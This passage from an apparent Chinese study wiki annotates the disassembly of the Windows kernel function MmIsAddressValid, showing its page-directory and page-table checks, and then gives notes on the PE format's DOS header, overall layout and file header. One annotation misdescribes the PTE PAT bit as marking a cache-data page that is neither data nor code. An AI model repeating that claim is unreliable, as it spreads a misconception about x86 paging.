; FUNCTION CHUNK AT .text:0041B856 SIZE 00000007 BYTES.text:0040C661 ; FUNCTION CHUNK AT .text:0044A562 SIZE 00000019 BYTES.text:0040C661.text:0040C661 mov edi, edi.text:0040C663 push ebp.text:0040C664 mov ebp, esp.text:0040C666 mov ecx, [ebp+VirtualAddress].text:0040C669 mov eax, ecx.text:0040C66B shr eax, 14h.text:0040C66E mov edx, 0FFCh.text:0040C673 and eax, edx.text:0040C675 sub eax, 3FD00000h.text:0040C67A mov eax, [eax].text:0040C67C test al, 1.text:0040C67E jz loc_41B856.text:0040C684 test al, al.text:0040C686 js short loc_40C6AC.text:0040C688 shr ecx, 0Ah.text:0040C68B and ecx, 3FFFFCh.text:0040C691 sub ecx, 40000000h.text:0040C697 mov eax, ecx.text:0040C699 mov ecx, [eax].text:0040C69B test cl, 1.text:0040C69E jz loc_41B856.text:0040C6A4 test cl, cl.text:0040C6A6 js loc_44A562.text:0040C6AC.text:0040C6AC loc_40C6AC: ; CODE XREF: MmIsAddressValid+25↑j.text:0040C6AC ; MmIsAddressValid+3DF0F↓j.text:0040C6AC mov al, 1.text:0040C6AE.text:0040C6AE loc_40C6AE: ; CODE XREF: MmIsAddressValid+F1F7↓j.text:0040C6AE pop ebp.text:0040C6AF retn 4.text:0040C6AF MmIsAddressValid endp.text:0041B856 ; ---------------------------------------------------------------------------.text:0041B856 ; START OF FUNCTION CHUNK FOR MmIsAddressValid.text:0041B856.text:0041B856 loc_41B856: ; CODE XREF: MmIsAddressValid+1D↑j.text:0041B856 ; MmIsAddressValid+3D↑j ....text:0041B856 xor al, al.text:0041B858 jmp loc_40C6AE.text:0041B858 ; END OF FUNCTION CHUNK FOR MmIsAddressValid.text:0041B85D ; ---------------------------------------------------------------------------.text:0044A562 ; ---------------------------------------------------------------------------.text:0044A562 ; START OF FUNCTION CHUNK FOR MmIsAddressValid.text:0044A562.text:0044A562 loc_44A562: ; CODE XREF: MmIsAddressValid+45↑j.text:0044A562 and eax, edx.text:0044A564 mov eax, [eax-3FD00000h].text:0044A56A and ax, 81h.text:0044A56E cmp al, 81h.text:0044A570 jnz loc_40C6AC.text:0044A576 jmp loc_41B856.text:0044A576 ; END OF FUNCTION CHUNK FOR MmIsAddressValid.text:0044A57B ; ---------------------------------------------------------------------------分析详细分析一览分析函数名字地址是否有效函数返回值类型是布尔，参数是DWORD类型的VirtualAddress123.text:0040C661 ; BOOLEAN __stdcall MmIsAddressValid(PVOID VirtualAddress).text:0040C661 VirtualAddress = dword ptr 8123.text:0040C661 mov edi, edi ; 热补丁.text:0040C663 push ebp.text:0040C664 mov ebp, esp ; 新的栈帧取出函数参数给ecx1.text:0040C666 mov ecx, [ebp+VirtualAddress]寻找PDE，对PDE字段的判断从32位线性地址得到PDI*4，然后+页目录表基址0xC0300000h去找PDE。取出32位线性地址的PDI并×4，这段代码用的是位运算，注意体会：123.text:0040C66B shr eax, 20 ; 右移20位，高位补0.text:0040C66E mov edx, 0FFCh.text:0040C673 and eax, edx ; 低两位清空，剩10位线性地址右移20位后，剩12位，高位补0；然后和0x0FFCh相与，将低2位清0（相当于左移2位，完成2^2运算，即×4）。判断PDE的P位如果P=1，有效，继续判断PDE的PS位如果是PS=1（大页），跳转到short loc_40C6AC，函数返回值给1，调用结束如果PS=0（小页），继续执行，找PTE如果P=0，无效，跳转到loc_41B856，函数返回值给0，调用结束12345678910111213.text:0040C669 mov eax, ecx.text:0040C66B shr eax, 20 ; 右移20位，高位补0.text:0040C66E mov edx, 0FFCh.text:0040C673 and eax, edx ; 低两位清空，剩10位.text:0040C675 sub eax, -0C0300000h ; 页目录表基址。eax+=0xC0300000h.text:0040C67A mov eax, [eax] ; 取[eax]处地址存储的值：PDE.text:0040C67C test al, 1 ; 判断PDE的P位.text:0040C67E jz loc_41B856 ; 如果al=0，表明该PDE的P位无效，ZF置1，jz跳转到loc_41B856，；.text:0040C67E ; 如果al=1，表明该PDE的P位有效，ZF置0，jz不跳转.text:0040C684 test al, al ; 判断PS位.text:0040C686 js short loc_40C6AC ; al与al相与后.text:0040C686 ; 如果符号位是1，SF=1，表明PS=1，是大页，js跳转到short loc_40C6AC：.text:0040C686 ; 如果符号位是0，SF=0，表明PS=0，是小页，js不跳转寻找PTE，对PTE字段的判断从32位线性地址得到PDI×0x1000+PTI×4+页表基址0xC0000000h去找PTE。得到PDI×0x1000+PTI×4这段代码用的是位运算，注意体会：123.text:0040C688 shr ecx, 10 ; 右移10位，高位补0.text:0040C68B and ecx, 3FFFFCh.text:0040C691 sub ecx, -0C0000000h ; 页表基址。eax+=0xC0000000h线性地址右移10位后，剩22位，高位补0；然后和3FFFFCh相与，将低2位清0。这个值是什么？从运算的角度上看：PDI||PTI||00PTI长度是10位，所以PDI左移了10位。(PDI×2^10+PTI)，然后低两位为0，整体×4，这个值是(PDI×2^10+PTI)×4=(PDI×0x400+PTI)×4=PDI×0x1000+PTI×4从含义上看：PDI表示在第几个PDT表，每个PDT表大小4kb。PTI表示在PTT表中的第几项，每一项4字节。所以是页表基址+PDI×0x1000+PTI×4。这个就是文章前边提的寻PTE公式。123456789101112.text:0040C688 shr ecx, 10 ; 右移10位，高位补0.text:0040C68B and ecx, 3FFFFCh.text:0040C691 sub ecx, -0C0000000h ; 页表基址。eax+=0xC0000000h.text:0040C697 mov eax, ecx.text:0040C699 mov ecx, [eax].text:0040C69B test cl, 1 ; 判断P位.text:0040C69E jz loc_41B856 ; 返回0，表示这个线性地址无效.text:0040C6A4 test cl, cl ; PTE最高位是PAT位，判断PAT位是否为1.text:0040C6A6 js loc_44A562 ; al与al相与后.text:0040C6A6 ; 如果符号位是1，SF=1，表明PAT=1，该页用于存储缓存相关数据，既不可作为数据段，也不可作为代码段执行，跳转到loc_44A562.text:0040C6A6 ; 如果符号位是0，SF=0，表明PAT=0，js不跳转.text:0040C6ACPAT=1后，跳转到loc_44A562：12345678910111213141516.text:0044A562 ; ---------------------------------------------------------------------------.text:0044A562 ; START OF FUNCTION CHUNK FOR MmIsAddressValid(x).text:0044A562.text:0044A562 loc_44A562: ; CODE XREF: MmIsAddressValid(x)+45↑j.text:0044A562 and eax, edx ; eax：PDI×0x1000+PTI×4.text:0044A562 ; edx：0x0FFCh.text:0044A562 ; and后得到PDE指针.text:0044A564 mov eax, [eax+0C0300000h] ; PDE指针+页目录表基址0xC0300000h，得到PDE的值.text:0044A56A and ax, 10000001b ; 判断PDE的PS位和P位.text:0044A56E cmp al, 10000001b ; al-81h.text:0044A56E ; 如果结果为0，ZF=1，表明PS位和P位都为1，有效且是大页，jnz跳转到loc_40C6AC.text:0044A56E ; 如果结果不为0，ZF=0，表明PS位和P位不同时为1，jnz不跳转，顺序执行，然后jmp loc_41B856.text:0044A570 jnz loc_40C6AC ; 返回1，该线性地址有效.text:0044A576 jmp loc_41B856 ; 返回0，表示这个线性地址无效.text:0044A576 ; END OF FUNCTION CHUNK FOR MmIsAddressValid(x).text:0044A57B ; ---------------------------------------------------------------------------函数返回值情况：返回0，表示这个线性地址无效123456789.text:0041B856 ; ---------------------------------------------------------------------------.text:0041B856 ; START OF FUNCTION CHUNK FOR MmIsAddressValid(x).text:0041B856.text:0041B856 loc_41B856: ; CODE XREF: MmIsAddressValid(x)+1D↑j.text:0041B856 ; MmIsAddressValid(x)+3D↑j ....text:0041B856 xor al, al ; 返回0，表示这个线性地址无效.text:0041B858 jmp loc_40C6AE.text:0041B858 ; END OF FUNCTION CHUNK FOR MmIsAddressValid(x).text:0041B85D ; ---------------------------------------------------------------------------返回1，表示这个线性地址有效12345678910.text:0040C6AC loc_40C6AC: ; CODE XREF: MmIsAddressValid(x)+25↑j.text:0040C6AC ; MmIsAddressValid(x)+3DF0F↓j.text:0040C6AC mov al, 1 ; 返回1，表示这个线性地址有效.text:0040C6AE.text:0040C6AE loc_40C6AE: ; CODE XREF: MmIsAddressValid(x)+F1F7↓j.text:0040C6AE pop ebp ; 结束调用，平栈.text:0040C6AF retn 4.text:0040C6AF _MmIsAddressValid@4 endp.text:0040C6AF.text:0040C6B2 ; ---------------------------------------------------------------------------流程图：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253.text:0040C661 ; =============== S U B R O U T I N E =======================================.text:0040C661.text:0040C661 ; Attributes: bp-based frame.text:0040C661.text:0040C661 ; BOOLEAN __stdcall MmIsAddressValid(PVOID VirtualAddress).text:0040C661 public _MmIsAddressValid@4.text:0040C661 _MmIsAddressValid@4 proc near ; CODE XREF: MiMakeSystemAddressValidPfn(x)+C↓p.text:0040C661 ; MiMakeSystemAddressValidPfnWs(x,x):loc_415470↓p ....text:0040C661.text:0040C661 VirtualAddress = dword ptr 8.text:0040C661.text:0040C661 ; FUNCTION CHUNK AT .text:0041B856 SIZE 00000007 BYTES.text:0040C661 ; FUNCTION CHUNK AT .text:0044A562 SIZE 00000019 BYTES.text:0040C661.text:0040C661 mov edi, edi ; 打补丁用的.text:0040C663 push ebp.text:0040C664 mov ebp, esp ; 保护现场.text:0040C666 mov ecx, [ebp+VirtualAddress].text:0040C669 mov eax, ecx.text:0040C66B shr eax, 20 ; 右移20位，高位补0.text:0040C66E mov edx, 0FFCh.text:0040C673 and eax, edx.text:0040C675 sub eax, -0C0300000h ; 页目录表基址。eax+=0xC0300000h.text:0040C67A mov eax, [eax] ; 取[eax]处地址存储的值：PDE.text:0040C67C test al, 1 ; 判断PDE的P位.text:0040C67E jz loc_41B856 ; 如果al=0，表明该PDE的P位无效，ZF置1，jz跳转到loc_41B856，；.text:0040C67E ; 如果al=1，表明该PDE的P位有效，ZF置0，jz不跳转.text:0040C684 test al, al ; 判断PS位.text:0040C686 js short loc_40C6AC ; al与al相与后.text:0040C686 ; 如果符号位是1，SF=1，表明PS=1，是大页，js跳转到short loc_40C6AC：.text:0040C686 ; 如果符号位是0，SF=0，表明PS=0，是小页，js不跳转.text:0040C688 shr ecx, 10 ; 右移10位，高位补0.text:0040C68B and ecx, 3FFFFCh.text:0040C691 sub ecx, -0C0000000h ; 页表基址。eax+=0xC0000000h.text:0040C697 mov eax, ecx.text:0040C699 mov ecx, [eax].text:0040C69B test cl, 1 ; 判断P位.text:0040C69E jz loc_41B856 ; 返回0，表示这个线性地址无效.text:0040C6A4 test cl, cl ; PTE最高位是PAT位，判断PAT位是否为1.text:0040C6A6 js loc_44A562 ; al与al相与后.text:0040C6A6 ; 如果符号位是1，SF=1，表明PAT=1，该页用于存储缓存相关数据，既不可作为数据段，也不可作为代码段执行，跳转到loc_44A562.text:0040C6A6 ; 如果符号位是0，SF=0，表明PAT=0，js不跳转.text:0040C6AC.text:0040C6AC loc_40C6AC: ; CODE XREF: MmIsAddressValid(x)+25↑j.text:0040C6AC ; MmIsAddressValid(x)+3DF0F↓j.text:0040C6AC mov al, 1 ; 返回1，该线性地址有效.text:0040C6AE.text:0040C6AE loc_40C6AE: ; CODE XREF: MmIsAddressValid(x)+F1F7↓j.text:0040C6AE pop ebp.text:0040C6AF retn 4.text:0040C6AF _MmIsAddressValid@4 endp.text:0040C6AF.text:0040C6B2 ; ---------------------------------------------------------------------------123456789.text:0041B856 ; ---------------------------------------------------------------------------.text:0041B856 ; START OF FUNCTION CHUNK FOR MmIsAddressValid(x).text:0041B856.text:0041B856 loc_41B856: ; CODE XREF: MmIsAddressValid(x)+1D↑j.text:0041B856 ; MmIsAddressValid(x)+3D↑j ....text:0041B856 xor al, al ; 返回0，表示这个线性地址无效.text:0041B858 jmp loc_40C6AE.text:0041B858 ; END OF FUNCTION CHUNK FOR MmIsAddressValid(x).text:0041B85D ; ---------------------------------------------------------------------------12345678910111213141516.text:0044A562 ; ---------------------------------------------------------------------------.text:0044A562 ; START OF FUNCTION CHUNK FOR MmIsAddressValid(x).text:0044A562.text:0044A562 loc_44A562: ; CODE XREF: MmIsAddressValid(x)+45↑j.text:0044A562 and eax, edx ; eax：PDI×0x1000+PTI×4.text:0044A562 ; edx：0x0FFCh.text:0044A562 ; and后得到PDE指针.text:0044A564 mov eax, [eax+0C0300000h] ; PDE指针+页目录表基址0xC0300000h，得到PDE的值.text:0044A56A and ax, 10000001b ; 判断PDE的PS位和P位.text:0044A56E cmp al, 10000001b ; al-81h.text:0044A56E ; 如果结果为0，ZF=1，表明PS位和P位都为1，有效且是大页，jnz跳转到loc_40C6AC.text:0044A56E ; 如果结果不为0，ZF=0，表明PS位和P位不同时为1，jnz不跳转，顺序执行，然后jmp loc_41B856.text:0044A570 jnz loc_40C6AC ; 返回1，该线性地址有效.text:0044A576 jmp loc_41B856 ; 返回0，表示这个线性地址无效.text:0044A576 ; END OF FUNCTION CHUNK FOR MmIsAddressValid(x).text:0044A57B ; ---------------------------------------------------------------------------"},{"title":"DOS部分","path":"/wiki/PE/DOS部分.html","content":"DOS部分由DOS MZ文件头和DOS块组成。DOS MZ文件头是个结构体IMAGE_DOS_HEADER。DOS块不是结构体，是一堆由单个字节组成的数据，可以填写任何内容。 DOS MZ文件头 DOS MZ文件头是一个结构体IMAGE_DOS_HEADER，大小64个字节。 winnt.h带偏移版123456789101112131415161718192021typedef struct _IMAGE_DOS_HEADER &#123; // DOS .EXE header WORD e_magic; // Magic number WORD e_cblp; // Bytes on last page of file WORD e_cp; // Pages in file WORD e_crlc; // Relocations WORD e_cparhdr; // Size of header in paragraphs WORD e_minalloc; // Minimum extra paragraphs needed WORD e_maxalloc; // Maximum extra paragraphs needed WORD e_ss; // Initial (relative) SS value WORD e_sp; // Initial SP value WORD e_csum; // Checksum WORD e_ip; // Initial IP value WORD e_cs; // Initial (relative) CS value WORD e_lfarlc; // File address of relocation table WORD e_ovno; // Overlay number WORD e_res[4]; // Reserved words WORD e_oemid; // OEM identifier (for e_oeminfo) WORD e_oeminfo; // OEM information; e_oemid specific WORD e_res2[10]; // Reserved words LONG e_lfanew; // File address of new exe header&#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;左边的数字是到文件头的偏移量123456789101112131415161718192021IMAGE_DOS_HEADER_STRUCT &#123; +0h e_magic WORD ? ;DOS可执行文件标记“MZ” +2h e_cblp WORD ? +4h e_cp WORD ? +6h e_crlc WORD ? +8h e_cparhdr WORD ? +0ah e_minalloc WORD ? +0ch e_maxalloc WORD ? +0eh e_ss WORD ? +10h e_sp WORD ? +12h e_csum WORD ? +14h e_ip WORD ? ;DOS代码入口 IP +16h e_cs WORD ? ;DOS代码入口 CS +18h e_lfarlc WORD ? +1ah e_ovno WORD ? +1ch e_res WORD 4 dup(?) +24h e_oemid WORD ? +26h e_oeminfo WORD ? +28h e_res2[10] WORD 10 dup(?) +3ch e_lfanew DWORD ? ;指向PE文件头“PE”,0,0&#125;IMAGE_DOS_HEADER_ENDS; 该结构体是给16位平台看的，很多成员在现在的环境(32位和64位)用不到，我们只需要关注其中的两个成员e_magic和e_lfanew。 e_magic，2字节，作为PE指纹的标识，要为4D 5A。 e_lfanew，4字节，全称是File Address of New Exe Header，位于文件开始偏移3Ch字节处，指出PE头（IMAGE_NT_HEADERS32）的起始位置（相对于文件头的偏移量）。 PE指纹不能修改，修改了程序就不能运行： 如果e_magic不为0x5A4Dh，则系统不会认定该文件是PE文件，双击无法运行。 从e_lfanew取出PE头偏移，根据偏移找过去后的Signature如果不为0x00004550，ASCII码字符“PE00”，则系统不会认定该文件是PE文件，双击无法运行。 DNS MZ文件头中除了e_magic和e_lfanew两个字段不可乱动外，其他字段可以任意修改，不影响运行。 DOS Stub 夹在DOS MZ文件头和PE文件头之间的内容就是DOS块。这里的内容可以根据需要随意修改，不影响程序运行。 DOS Stub里是16位的汇编代码，有兴趣可以看下 羽夏壳世界—— PE 结构（上） A dive into the PE file format - PE file structure - Part 2: DOS Header, DOS Stub and Rich Header"},{"title":"Overview","path":"/wiki/PE/Overview_PE.html","content":"可执行文件(executable file)指的是可以由操作系统进行加载执行的文件。一个可执行文件想被操作系统加载器加载到内存中执行，它需要按照要求的文件规范对信息进行存放，不同系统上可执行文件的格式如下： Windows平台：PE（Portable Executable）文件结构 Linux平台:：ELF（Executable and Linking Format）文件结构 从“Portable Executable”可以看出微软设计的目的，系统有一个通用于所有Windows平台和CPU（x86，MIPS、Alpha等）的文件格式。 学习PE文件就是学习文件格式，组织这些数据的规范。头文件winnt.h中描述了PE及COFF格式相关的数据结构定义、枚举类型、常量定义。官方文档PE Format。 PE指纹 在Windows平台（包括 Win 9x、Win NT、Win CE……）下，所有的可执行文件（包括EXE文件、DLL文件、SYS文件、OCX 文件、COM文件……）均使用PE文件结构。这些使用PE文件结构的可执行文件也称为PE文件。 摘自《C++黑客编程揭秘与防范(第3版)》 判断一个文件是否是PE格式，不能仅凭借文件的扩展名来确定。文件扩展名是可以任意更改的，它仅仅是操作系统用来帮助用户更便捷地通过特定应用程序打开文件的标识。例如，在Windows操作系统中，如果指定potplayer程序来打开.mp4文件，那么用户双击任何一个.mp4文件时，系统都会自动用potplayer来打开它。即使将.mp4文件的扩展名更改为.bac或其他无关的扩展名，只要在打开文件的方式中选择potplayer，文件依然可以被打开。这也解释了为什么通常我们不会随意更改文件的扩展名，因为这样做有助于我们更方便地使用文件。 正确辨别PE文件的方法是通过二进制编辑工具（例如WinHex、UE、010 Editor等）打开文件进行检查： 首先观察文件开头的两个字节是否为0x4D和0x5A，这两个字节的十六进制表示为0x5A4D，对应的ASCII字符是&quot;MZ&quot; 根据e_lfanew字段（从文件头开始偏移0x3Ch字节的位置）的值找到PE头起始位置。PE头偏移位置第一个字段是Signature，该字段的值应为0x00004550，其对应的ASCII字符是&quot;PE\\0\\0&quot;（&quot;PE&quot;后跟两个空字符）。 .exe.dll.sys.ocx.com.pdf.zip Structure Overview PE文件由四部分组成，从文件头到文件尾依次是：DOS部分、PE文件头、节表、节数据。 Section，又称区段，节，节区，区块，块，后文不作区分。 一级类别 成员 字段 大小 对齐要求 范围 DOS头 DOS MZ头，又称MZ头部 IMAGE_DOS_HEADER 64字节 （DOS头+PE头+节表）的大小是FileAlignment的整数倍 起始：从文件头开始末尾：起始+0x40h DOS Stub，又称DOS存根，又称DOS残留 一堆数据 无固定长度 MZ头和PE头之间 PE头（IMAGE_FILE_HEADER） PE标识，PE文件头标识 Signature 4字节 起始：由e_lfanew找到起始位置末尾：4字节 标准PE头，又称文件头 IMAGE_FILE_HEADER 20字节 起始：PE头+4字节末尾：起始+20字节 扩展PE头，又称可选头 IMAGE_OPTIONAL_HEADER32IMAGE_OPTIONAL_HEADER64 224字节，E0h240字节，F0h大小可变 起始：PE头+4字节+20字节末尾：起始+SizeOfOptionalHeader 节表（结构体数组） 节表一 IMAGE_SECTION_HEADER 40字节 起始：PE头+4字节+20字节+SizeOfOptionalHeader末尾：起始+40字节 节表二 IMAGE_SECTION_HEADER 40字节 ... ... 40字节 （Section的个数由标准PE头的NumberOfSections得知） 节表n IMAGE_SECTION_HEADER 40字节 节表数据 节表一的数据 一堆数据 无固定长度 大小是FileAlignment的整数倍 起始：节表一中的PointToRawData 节表二的数据 一堆数据 无固定长度 大小是FileAlignment的整数倍 ... 一堆数据 无固定长度 大小是FileAlignment的整数倍 节表n的数据 一堆数据 无固定长度 大小是FileAlignment的整数倍 原始表格一级类别成员字段大小对齐要求范围DOS头DOS MZ头，又称MZ头部IMAGE_DOS_HEADER64字节起始：从文件头开始末尾：起始+0x40hDOS Stub，又称DOS存根，又称DOS残留一堆数据无固定长度MZ头和PE头之间PE头（IMAGE_FILE_HEADER）PE标识，PE文件头标识Signature4字节起始：由e_lfanew找到起始位置末尾：4字节标准PE头，又称文件头IMAGE_FILE_HEADER20字节起始：PE头+4字节末尾：起始+20字节扩展PE头，又称可选头IMAGE_OPTIONAL_HEADER32IMAGE_OPTIONAL_HEADER64224字节,E0h240字节，F0h大小可修改起始：PE头+4字节+20字节末尾：起始+SizeOfOptionalHeader节表（结构体数组）节表一IMAGE_SECTION_HEADER40字节起始：PE头+4字节+20字节+SizeOfOptionalHeader末尾：起始+40字节节表二IMAGE_SECTION_HEADER40字节……40字节（Section的个数由标准PE头的NumberOfSections得知）节表nIMAGE_SECTION_HEADER40字节（DOS头+PE头+节表）的大小是FileAlignment的整数倍节表数据节表一的数据一堆数据无固定长度大小是FileAlignment的整数倍起始：节表一中的PointToRawData节表二的数据一堆数据无固定长度大小是FileAlignment的整数倍…一堆数据无固定长度大小是FileAlignment的整数倍节表n的数据一堆数据无固定长度大小是FileAlignment的整数倍 DOS部分 DOS头由两部分组成：DOS MZ文件头(IMAGE_DOS_HEADER结构)和DOS Stub。 DOS MZ文件头大小64个字节，只需关注两个字段： e_magic：PE标识，4D 5A。 e_lfanew：DOS MZ文件头的最后一个成员，大小4字节，指向PE头（IMAGE_NT_HEADERS32）的起始位置。 DOS Stub大小不定，是夹在DOS MZ文件头和PE文件头之间的数据。这块是给链接器用的，链接器会往这里插入数据，可以人为修改或删除，不影响程序运行。 编辑器一行16个字节，4行就是64字节。 PE文件头 PE文件头是一个结构体（IMAGE_NT_HEADERS），该结构体有三个成员：PE文件头标志、标准PE头、扩展PE头。 PE文件头标志，4字节，是PE标识。在一个有效的PE文件里，Signature字段是0x00004550，ASCII字符是“PE00”。 标准PE头中的重要字段有： NumberOfSections：当前PE文件含有几个Section。 SizeOfOptionalHeader：指出拓展PE头的大小。未做修改的默认情况下，32位和64位PE文件扩展PE头的大小如下： 文件位数 十六进制 十进制 PE32 E0h 224字节 PE32+（PE64） F0h 240字节 往扩展PE头中加私货的话需要修改这个字段。 Characteristics：文件属性。位掩码，表明该PE文件的文件属性。 扩展PE头。PE32+和PE32的差异很小，PE32+相比于PE32少去了一个DWORD长度的BaseOfData成员，ImageBase、SizeOfStackReserve、SizeOfStackCommit、SizeOfHeapReserve、SizeOfHeapCommit成员由DWORD扩宽到了ULONGLONG。 扩展PE头之所以比较大，因为最后一个成员是个结构体数组，每个结构体大小是16个字节。 扩展PE头中的重要字段有： Magic：标识当前文件时PE32还是PE32+。 PE的位数 值 PE32 010Bh PE32+ 020Bh AddressOfEntryPoint：程序执行入口RVA，指PE文件在内存拉伸展开后，程序从哪个地址开始执行。这个值是相对于ImageBase的偏移。 ImageBase：内存镜像基址。指PE文件在内存中首选在哪个地址开始载入拉伸。 SectionAlignment：PE文件在内存时的区块对齐值。 FileAlignment：PE文件在磁盘上时的区块对齐值。 SizeOfImage：内存中整个PE文件映射的大小，≥实际用的值才能运行 SizeOfHeaders：DOS头+PE文件头+节表按照文件对齐后的大小。 CheckSum：PE文件的检验和。 DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]：数据目录表，是个结构体数组。不同的成员是不同的表。 0E0h，224个字节，224/16=14行 节表 是个结构体数组，成员是IMAGE_SECTION_HEADER结构体，结构体大小是40个字节，它包含了它所关联的区块的信息。重要字段有： Misc：表示区块的实际大小（未对齐）。 VirtualAddress：该区块载入内存后的RVA。 SizeOfRawData：该区块在磁盘文件中对齐后的大小。 PointerToRawData：该块在磁盘文件中的偏移。 Characteristics：块属性。位掩码，指出块属性（例如代码/数据、可读/可写等)。 上图中，不同颜色表示不同的节表。这个例子中有6个节表。 在节表后边是为了对齐文件偏移而填充的padding，这里可能有编译器插入的数据，不能随便改，要不exe加载运行时会有问题，虽然这里的数据与PE文件格式无关。 节数据 存放PE文件中actual contents的地方，包括数据、资源、代码等。 Tools-&gt;Open RAM winnt.h带偏移版"},{"title":"PE头","path":"/wiki/PE/PE头.html","content":"PE头是一个结构体IMAGE_NT_HEADERS，该结构体有三个成员：PE标识，标准PE头，扩展PE头。 结构体 成员 大小 IMAGE_NT_HEADERS Signature 4字节 IMAGE_FILE_HEADER 20字节 IMAGE_OPTIONAL_HEADER 32位是224字节，0xE0h字节。64位是240字节，0xF0h字节。大小可修改 winnt.h带偏移版12345typedef struct _IMAGE_NT_HEADERS &#123; DWORD Signature; // PE标识 IMAGE_FILE_HEADER FileHeader; // 标准PE头 IMAGE_OPTIONAL_HEADER32 OptionalHeader; // 扩展PE头&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;以下的偏移量是基于PE文件头（IMAGE_NT_HEADERS） 12345IMAGE_NT_HEADERS_STRUCT&#123; +0h Signature DWORD ? ;PE文件标识 +4h FileHeader IMAGE_FILE_HEADER &lt;&gt; ;标准PE头 +18h OptionalHeader IMAGE_OPTIONAL_HEADER32 &lt;&gt; ;扩展PE头&#125;IMAGE_DOS_HEADER_ENDS; PE标识 结构体中第一个成员是PE标识，PE标识不能破坏，操作系统在启动一个程序的时候会检测这个标识。 在一个有效的PE文件里，Signature字段被设置为0x00004550，ASCII 码字符是“PE00”，#define IMAGE_NT_SIGNATURE定义了这个值： 1#define IMAGE_NT_SIGNATURE 0x00004550 “PE00”是PE文件头的开始，MS-DOS头部的e_lfanew字段正是指向“PE\\0\\0”。 标准PE头 结构体中第二个成员是个结构体IMAGE_FILE_HEADER，大小为20个字节，该结构体又称为标准PE头。 winnt.h带偏移版123456789typedef struct _IMAGE_FILE_HEADER &#123; WORD Machine; //该PE文件支持运行的平台 WORD NumberOfSections; //Section的数量 DWORD TimeDateStamp; //编译器填写的时间戳 DWORD PointerToSymbolTable; //调试相关 DWORD NumberOfSymbols; //调试相关 WORD SizeOfOptionalHeader; //标识了IMAGE_OPTIONAL_HEADER32结构的大小 WORD Characteristics; //文件属性&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;以下的偏移量是基于PE文件头（IMAGE_NT_HEADERS）。 12345678910typedef struct _IMAGE_FILE_HEADER &#123; +04h WORD Machine; //该PE文件支持运行的平台 +06h WORD NumberOfSections; //Section的数量 +08h DWORD TimeDateStamp; //编译器填写的时间戳 +0Ch DWORD PointerToSymbolTable; //调试相关 +10h DWORD NumberOfSymbols; //调试相关 +14h WORD SizeOfOptionalHeader; //标识了IMAGE_OPTIONAL_HEADER32结构的大小 +16h WORD Characteristics; //文件属性&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER; Machine：表示当前可执行文件可以在哪些CPU上运行。如下是几种典型的机器类型标志。 机器 标志 任意CPU 0x0000h Intel i386及后续的型号CPU 0x14Ch 64位的CPU型号 0x8664 MIPS R3000 162h MIPS R4000 166h Alpha AXP 184h Power PC 1F0h 1234567891011121314151617181920212223242526272829303132#define IMAGE_FILE_MACHINE_UNKNOWN 0#define IMAGE_FILE_MACHINE_TARGET_HOST 0x0001 // Useful for indicating we want to interact with the host and not a WoW guest.#define IMAGE_FILE_MACHINE_I386 0x014c // Intel 386.#define IMAGE_FILE_MACHINE_R3000 0x0162 // MIPS little-endian, 0x160 big-endian#define IMAGE_FILE_MACHINE_R4000 0x0166 // MIPS little-endian#define IMAGE_FILE_MACHINE_R10000 0x0168 // MIPS little-endian#define IMAGE_FILE_MACHINE_WCEMIPSV2 0x0169 // MIPS little-endian WCE v2#define IMAGE_FILE_MACHINE_ALPHA 0x0184 // Alpha_AXP#define IMAGE_FILE_MACHINE_SH3 0x01a2 // SH3 little-endian#define IMAGE_FILE_MACHINE_SH3DSP 0x01a3#define IMAGE_FILE_MACHINE_SH3E 0x01a4 // SH3E little-endian#define IMAGE_FILE_MACHINE_SH4 0x01a6 // SH4 little-endian#define IMAGE_FILE_MACHINE_SH5 0x01a8 // SH5#define IMAGE_FILE_MACHINE_ARM 0x01c0 // ARM Little-Endian#define IMAGE_FILE_MACHINE_THUMB 0x01c2 // ARM Thumb/Thumb-2 Little-Endian#define IMAGE_FILE_MACHINE_ARMNT 0x01c4 // ARM Thumb-2 Little-Endian#define IMAGE_FILE_MACHINE_AM33 0x01d3#define IMAGE_FILE_MACHINE_POWERPC 0x01F0 // IBM PowerPC Little-Endian#define IMAGE_FILE_MACHINE_POWERPCFP 0x01f1#define IMAGE_FILE_MACHINE_IA64 0x0200 // Intel 64#define IMAGE_FILE_MACHINE_MIPS16 0x0266 // MIPS#define IMAGE_FILE_MACHINE_ALPHA64 0x0284 // ALPHA64#define IMAGE_FILE_MACHINE_MIPSFPU 0x0366 // MIPS#define IMAGE_FILE_MACHINE_MIPSFPU16 0x0466 // MIPS#define IMAGE_FILE_MACHINE_AXP64 IMAGE_FILE_MACHINE_ALPHA64#define IMAGE_FILE_MACHINE_TRICORE 0x0520 // Infineon#define IMAGE_FILE_MACHINE_CEF 0x0CEF#define IMAGE_FILE_MACHINE_EBC 0x0EBC // EFI Byte Code#define IMAGE_FILE_MACHINE_AMD64 0x8664 // AMD64 (K8)#define IMAGE_FILE_MACHINE_M32R 0x9041 // M32R little-endian#define IMAGE_FILE_MACHINE_ARM64 0xAA64 // ARM64 Little-Endian#define IMAGE_FILE_MACHINE_CEE 0xC0EE NumberOfSections：当前PE文件含有Section的数量，也就是PE头（IMAGE_NT_HEADERS）后有几个节表。 TimeDateStamp：编译器编译时填写的时间戳。这个值是自1970年1月1日以来用格林威治时间(GMT)计算的秒数，即计算的是当前时间与1970年01月01日00时00分00秒差的秒数，比如2010年10月10号10点10分10秒编译的，这个时间相比于1970年01月01日00时00分00秒过去了多少秒，转成十六进制。将这个值翻译为易读的字符串需要使用_ctime函数(它是时区敏感型的)。另一个对此字段计算有用的函数是gmtime。 与在操作系统上对一个文件右键看到的创建、修改、访问时间没关系。右键看到的创建、修改、访问时间是操作系统记录的时间。 TimeDateStamp可以随意修改。 一些加壳软件加壳时要求提供.exe和.map文件，通过比对exe和.map文件的该字段来判断.map是否和这个exe是否是配对的。例：.map是上周生成的，.exe是刚编译的，它两不是配对的一堆，这样的话加壳时会乱套。.map文件是什么.map文件在C语言编程中是由链接器生成的一种文件，它提供了编译后的程序中函数和变量的地址映射信息。这个文件包含了源代码中的符号（如函数、变量等）到其在可执行文件中的地址的映射关系。这对于调试和程序分析非常有用。加壳软件可以通过.map文件提供的符号信息来对exe进行加壳保护。 PointerToSymbolTable：调试相关，暂不了解 